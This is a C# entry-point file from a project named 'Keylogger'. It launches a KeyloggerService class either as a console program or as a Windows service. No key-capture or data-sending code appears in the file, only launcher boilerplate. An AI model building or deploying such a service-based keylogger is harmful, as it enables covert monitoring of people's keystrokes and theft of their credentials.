using System;
using System.ServiceProcess;

namespace Keylogger
{
    public static class Program
    {
        public static void Main(string[] args)
        {
            if (Environment.UserInteractive)
            {
                KeyloggerService keyloggerService = new KeyloggerService();

                keyloggerService.ExecuteAsConsoleApplication(args);
            }
            else
            {
                ServiceBase[] ServicesToRun;

                ServicesToRun = new ServiceBase[]
                {
                    new KeyloggerService()
                };

                ServiceBase.Run(ServicesToRun);
            }
        }
    }
}